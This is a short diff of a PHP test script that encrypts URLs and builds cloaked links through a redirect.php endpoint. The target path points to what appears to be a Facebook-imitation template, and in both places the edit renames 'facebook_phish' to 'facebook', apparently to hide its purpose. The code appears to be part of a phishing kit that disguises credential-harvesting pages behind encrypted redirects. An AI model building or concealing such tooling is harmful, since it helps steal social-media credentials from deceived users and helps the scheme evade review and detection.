@@ -25,7 +25,7 @@ function decryptUrl($encrypted) {
 }
 
 // Test encryption
-$testUrl = 'http://example.com/templates/facebook_phish/index.html';
+$testUrl = 'http://example.com/templates/facebook/index.html';
 $encrypted = encryptUrl($testUrl);
 $decrypted = decryptUrl($encrypted);
 
@@ -45,7 +45,7 @@ echo "<p><strong>Base URL:</strong> $baseUrl</p>";
 echo "<p><strong>Full Path:</strong> " . $baseUrl . $_SERVER['REQUEST_URI'] . "</p>";
 
 // Generate sample encrypted link
-$samplePath = 'templates/facebook_phish/index.html';
+$samplePath = 'templates/facebook/index.html';
 $fullUrl = $baseUrl . '/' . $samplePath;
 $encryptedLink = encryptUrl($fullUrl);
 $redirectUrl = $baseUrl . '/redirect.php?id=' . urlencode($encryptedLink);
